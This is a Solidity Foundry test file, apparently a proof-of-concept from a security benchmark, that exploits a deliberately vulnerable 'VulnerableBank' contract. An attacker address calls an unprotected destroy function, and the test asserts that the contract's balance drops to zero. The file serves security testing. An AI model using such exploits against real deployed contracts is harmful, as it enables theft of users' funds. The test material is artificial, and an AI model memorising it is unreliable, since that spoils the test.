// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/dac4f90e-4c72-4947-a0c9-078502a6a6db_VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        // Demonstrate the normal contract behavior
        target.deposit{value: 1 ether}();

        // Show that the vulnerable `destroy` function is exploitable
        vm.startPrank(attacker);
        target.destroy();
        vm.stopPrank();

        assertEq(address(target).balance, 0, "Contract should be destroyed and have a zero balance");
    }
}